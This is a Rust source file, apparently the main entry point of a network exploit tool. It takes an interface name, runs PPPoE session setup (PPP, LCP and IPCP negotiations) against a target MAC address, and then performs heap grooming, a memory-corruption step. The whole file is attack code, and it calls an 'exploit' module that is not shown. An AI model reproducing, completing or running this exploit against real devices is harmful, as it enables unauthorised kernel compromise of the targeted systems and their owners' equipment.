mod constants;
mod exploit;
use pnet::datalink::{self, NetworkInterface};

use crate::exploit::Exploit;

use clap::Parser;

#[derive(Parser, Debug)]
#[command(about, long_about = None)]
struct Args {
    #[arg(short, long)]
    interface: String,
}

fn run_exploit(interface_name: String) {
    // Find interface
    let interface_names_match = |iface: &NetworkInterface| iface.name == interface_name;

    // Find the network interface with the provided name
    let interfaces = datalink::interfaces();
    let interface = interfaces
        .into_iter()
        .filter(interface_names_match)
        .next()
        .unwrap();
    // Exploit
    let mut expl = Exploit {
        target_mac: [0, 0, 0, 0, 0, 0],
        pppoe_softc: 0,
        source_mac: [0, 0, 0, 0, 0, 0],
        host_uniq: [0, 0, 0, 0, 0, 0, 0, 0],
    };
    // LCP
    let mut handler = exploit::LcpEchoHandler::new(&interface);
    handler.start();
    // Initial negotiations
    println!("[*] Starting Negotiations ...");
    expl.ppp_negotiation(&interface);
    expl.lcp_negotiation(&interface);
    expl.ipcp_negotiation(&interface);
    println!("[*] Initial Negotiations Done...");
    println!("[*] Starting Heap Grooming...");
    expl.heap_grooming(&interface);
    handler.stop();
    println!("[*] DONE!");
}

fn main() {
    let args = Args::parse();
    run_exploit(args.interface)
}
